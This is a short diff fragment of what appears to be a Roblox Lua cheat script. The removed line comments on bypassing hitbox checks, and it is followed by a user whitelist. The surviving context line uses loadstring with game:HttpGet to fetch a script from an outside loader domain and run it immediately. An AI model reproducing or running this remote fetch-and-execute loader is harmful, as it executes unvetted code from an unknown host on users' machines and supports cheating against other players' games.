@@ -1,4 +1,3 @@
--- # bypass anti hitbox cdvn
 loadstring(game:HttpGet("https://shzwl.sbs/loaders/discordx2swnz.lua"))()
 local allowedUsers = {
     ["b123vnoo"] = true,
